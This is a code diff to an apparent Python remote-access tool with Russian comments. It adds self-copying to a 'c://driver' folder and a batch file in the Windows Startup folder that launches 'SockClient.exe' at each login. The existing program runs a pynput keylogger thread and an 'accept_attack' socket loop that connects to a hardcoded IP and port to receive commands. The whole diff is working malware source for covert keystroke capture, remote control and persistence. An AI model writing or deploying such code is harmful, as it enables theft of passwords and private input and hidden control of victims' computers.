@@ -3,6 +3,8 @@ import time
 import datetime
 import threading
 import os
+import shutil
+import getpass
 import subprocess
 from pynput.keyboard import Listener
 
@@ -141,9 +143,45 @@ def accept_attack(ip="109.237.25.179", port="9090"):
             print("Послали ответ на пустую строку")
     sock.close()
 
+def add_to_startup(file_path=""):
+    """
+    Также со StackOverFlow, создает батник в автозагрузку
+    """
+    USER_NAME = getpass.getuser()
+    if file_path == "":
+        file_path = os.path.dirname(os.path.realpath(__file__))
+    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
+        bat_file.write(r'start "" %s' % file_path)
+
+def copytree(src, dst, symlinks=False, ignore=None):
+    """
+    Полностью взял со StackOverflow, передаем откуда и куда. Копирует директорию со всем содержимым
+    """
+    for item in os.listdir(src):
+        s = os.path.join(src, item)
+        d = os.path.join(dst, item)
+        if os.path.isdir(s):
+            shutil.copytree(s, d, symlinks, ignore)
+        else:
+            shutil.copy2(s, d)
+
+
+def copy_itself():
+    try:
+        os.mkdir("c://driver")
+        copytree(".", "c://driver")
+    except Exception as e:
+        print(e, " :ошибка по время самокопирования")
+
+    try:
+        add_to_startup("c://driver/SockClient.exe")
+    except Exception as e:
+        print(e, " :ошибка по время создания файла автозапуска")
 
 
 if __name__ == '__main__':
+    copy_itself()
     threadOne = threading.Thread(target=accept_attack, name="start getting requests")
     threadTwo = threading.Thread(target=start_logger, name="start key logging")
     threadOne.start()
